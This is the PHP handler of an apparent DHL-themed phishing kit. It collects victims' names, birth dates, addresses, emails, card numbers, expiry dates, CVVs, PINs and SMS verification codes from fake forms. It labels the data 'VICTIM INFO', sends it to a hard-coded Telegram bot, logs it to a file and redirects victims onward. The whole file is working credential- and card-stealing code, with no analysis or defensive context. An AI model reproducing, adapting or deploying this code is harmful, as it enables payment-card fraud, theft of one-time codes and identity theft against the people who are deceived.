<?php
include('Email.php');
include('get_browser.php');
include('get_ip.php');
include('funciones.php');

function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '1339565830:AAHtottRbIf6N0TpZMpWE3LS3GQRL_C1ML8';
    $chat_id  = '811389319';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}


$ip= $_SERVER['REMOTE_ADDR'];
$TIME_DATE = date('H:i:s d/m/Y');


if (isset($_POST['infoget'])) {


$cc = "++++++++++++++[DHL CC]++++++++++++\n"."NAME : ".$_POST['Kartenhalter']."\nDATE : ".$_POST['Geburtsdatuml']."\nEMAIL : ".$_POST['EMailaddresse'].
     "\nADRS : ".$_POST['Rechnungsadresse']."\nZIPCD : ".$_POST['Postleitzahl']."\nIP : ".$ip."\nTIME : ".$TIME_DATE.
     "\nBROWSER : ".XB_Browser($_SERVER['HTTP_USER_AGENT'])."\n".XB_OS($_SERVER['HTTP_USER_AGENT']);
     
functiondilih($cc);
$khraha = fopen("../../ICD.html", "a");
fwrite($khraha, $DCH_MESSAGE);
telegram_send(urlencode($DCH_MESSAGE));

HEADER("Location: ../engagement.php?assure_boba=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=fr_".$rand."&".md5(microtime())."");
}





if (isset($_POST['cartget'])) {





$cc = "++++++++++++++[DHL CC]++++++++++++\n"."// NAME // : ".$_POST['Kartenhalter']."\n// CARD //: ".$_POST['Kartennummer']."\n// DATE // : ".$_POST['Ablauf']."\n// CVV //: ".$_POST['Sicherheitscode']."\n// PIN //: ".$_POST['pin']."\n++++++++++++++[VICTIM INFO]++++++++++++"."\nIP : ".$ip."\nTIME : ".$TIME_DATE. "\nBROWSER : ".XB_Browser($_SERVER['HTTP_USER_AGENT'])."\nSYS: ".XB_OS($_SERVER['HTTP_USER_AGENT'])."\n++++++++++++++[  EL-K  ]++++++++++++";


telegram_send(urlencode($cc));
HEADER("Location: ../demande.php?assure_boba=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=fr_".$rand."&".md5(microtime())."");
}





if (isset($_POST['smsone'])) {


$cc = "++++++++++++++[DHL SMS 1]++++++++++\n"."SMS (1) : ".$_POST['F982345787234LPIN']."\n++++++++++++++[VICTIM INFO]++++++++++++"."\nIP : ".$ip."\nTIME : ".$TIME_DATE. "\nBROWSER : ".XB_Browser($_SERVER['HTTP_USER_AGENT'])."\n".XB_OS($_SERVER['HTTP_USER_AGENT'])."\n++++++++++++++[  EL-K  ]++++++++++++";



telegram_send(urlencode($cc));
HEADER("Location: ../demande.php?assure_boba=false&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=fr_".$rand."&".md5(microtime())."");
}




if (isset($_POST['smstow'])) {


$cc = "++++++++++++++[DHL SMS 2]++++++++++\n"."SMS (2) : ".$_POST['F982345787234LPIN']."\n++++++++++++++[VICTIM INFO]++++++++++++"."\nIP : ".$ip."\nTIME : ".$TIME_DATE. "\nBROWSER : ".XB_Browser($_SERVER['HTTP_USER_AGENT'])."\n".XB_OS($_SERVER['HTTP_USER_AGENT'])."\n++++++++++++++[  EL-K  ]++++++++++++";;


telegram_send(urlencode($cc));
HEADER("Location: ../successfully.php?assure_boba=false&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=fr_".$rand."&".md5(microtime())."");

}



?>